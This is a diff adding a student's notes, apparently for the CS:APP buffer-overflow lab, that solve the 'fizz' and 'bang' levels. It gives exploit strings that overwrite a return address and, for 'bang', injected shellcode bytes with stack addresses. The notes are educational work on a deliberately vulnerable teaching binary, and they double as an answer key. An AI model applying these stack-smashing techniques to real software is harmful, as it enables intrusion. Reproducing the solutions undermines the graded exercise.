@@ -64,3 +64,55 @@ the other bytes can be whatever you like
 
 int a little endian machine, solution can be 
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 18 8c 04 08
+
+#******************************************************
+fizz:
+#******************************************************
+
+solution for fizz is too simple
+
+similar to smoke, set the return addrees of function of getbuf to the address of function fizz
+the difference is fizz take a argument, and the argument must be equal to cookie
+
+go to function fizz at address 0x08048c42, we can see the argument stored at address next 8 bytes of %esp
+the cookie is generate by makecookie with you name
+
+my cookie is 0x386a9f7f, so the solution is:
+* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 42 8c 04 08 * * * * 7f 9f 6a 38 
+
+#******************************************************
+bang:
+#******************************************************
+
+go to function bang at address 0x08048c9d
+with the instruct at address 0x08048ca3, 0x08048ca8 and function fizz,
+we can determine the globla_value at address 0x804d100, and cookie at 0x804d108
+
+to set the global_value in yourself instructs, we generate the byte codes like the eample in buflab32.pdf
+
+first, touch a bang.s file in assemble(see the bang.s in folder buflab)
+then compile it to an object file by command "gcc -m32 -c bang.s"
+to get the instruction in hex digit, we disassemble bang.s with command "objdump -d bang.o > bang.d"
+
+the genareted byte codes now in file bang.d
+
+now, it's necessary to let the getbuf ret to an address which points to the genareted byte codes by last step
+so the instruct will execute in your way
+
+this time, we set the return address point to the start address of input string, not a specifc function
+the start address of input string is %ebp-0x28(40), we can get it in gdb, 0x556835b8
+
+and store the genareted byte codes in the stack address 0, to 35
+the stack organization is above in smoke
+
+the solution is:
+a1 08 d1 04 08
+a3 00 d1 04 08
+68 9d 8c 04 08
+c3
+30 30 30 30 30
+30 30 30 30 30
+30 30 30 30 30
+30 30 30 30 30
+30 30 30 30 30
+30 30 30 b8 35 68 55
